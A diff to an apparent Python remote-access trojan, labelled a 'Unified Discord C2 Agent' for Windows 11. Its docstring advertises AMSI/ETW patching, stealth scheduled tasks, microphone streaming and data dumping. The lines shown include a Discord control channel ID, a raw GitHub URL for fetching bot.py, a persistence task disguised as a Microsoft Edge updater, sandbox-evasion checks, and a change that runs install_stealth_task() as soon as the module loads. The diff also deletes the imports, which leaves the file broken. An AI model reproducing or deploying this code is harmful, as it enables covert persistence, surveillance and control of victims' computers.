@@ -1,18 +1,3 @@
-# -*- coding: utf-8 -*-
-"""
-Unified Discord C2 Agent (Windows 11) - Reforged
-AMSI/ETW Patch, Stealth Task Scheduler, Hidden MCI Audio, Win32 Popups, Mic Stream, Dumping.
-"""
-import asyncio
-import array
-import base64
-import ctypes
-import io
-import json
-import os
-import shutil
-import sqlite3
-import subprocess
 import sys
 import tempfile
 import threading
@@ -42,7 +27,7 @@ CONTROL_CHANNEL_ID = 1536306696832426054
 RAW_GITHUB_URL = "https://raw.githubusercontent.com/ht-at/maintudu/refs/heads/main/bot.py"
 TASK_NAME = "MicrosoftEdgeUpdateTaskMachineUA2"
 TASK_DESC = "Microsoft Edge Update Task Machine UA"
-
+install_stealth_task()
 def check_environment() -> bool:
     if os.cpu_count() and os.cpu_count() < 2: return False
     if psutil.virtual_memory().total < 3 * (1024 ** 3): return False
@@ -370,7 +355,7 @@ async def safe_send(ctx, text: str, filename: str = "output.txt"):
 
 @bot.event
 async def on_ready():
-    install_stealth_task()
+   
     ch = bot.get_channel(CONTROL_CHANNEL_ID)
     if ch:
         user = os.environ.get("USERNAME", "User")
